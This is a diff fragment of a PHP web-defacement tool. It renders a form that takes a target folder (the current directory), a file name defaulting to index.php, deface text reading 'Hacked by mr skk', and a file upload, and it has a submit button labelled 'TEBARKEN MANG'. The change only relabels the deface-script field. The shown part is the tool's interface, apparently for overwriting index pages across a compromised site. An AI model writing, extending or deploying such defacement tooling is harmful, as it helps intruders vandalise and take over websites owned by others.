@@ -9,7 +9,7 @@ echo "<img src='https://res.cloudinary.com/di1pwoapk/image/upload/v1741152887/sk
 echo "<hr color='black'><font color='black'>Target Folder</font><br>";
 echo "<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd()."'><br><br>";
 echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
-echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(#);' name='index'>Hacked by mr skk</textarea><br>";
+echo "<font color='black'>Script na asupken</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(#);' name='index'>Hacked by mr skk</textarea><br>";
 echo "<font color='black'>Upload File</font><br><input type='file' name='upload_file'><br>";
 echo "<input type='submit' value='TEBARKEN MANG'></form></center>";
 
